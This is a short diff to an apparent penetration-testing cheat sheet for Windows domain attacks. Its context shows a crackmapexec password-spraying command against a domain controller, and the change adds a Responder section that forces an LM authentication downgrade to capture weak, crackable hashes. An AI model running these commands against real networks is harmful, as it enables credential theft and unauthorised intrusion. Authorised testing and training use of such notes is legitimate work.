@@ -71,7 +71,12 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
 ## Responder
 ### Kickstart responder
 ```bash
-responder -I eth0 -v
+responder -I eth0
+```
+
+### Force lm downgrade
+```bash
+responder -I eth0 --lm
 ```
 
 ### Responder linkifle
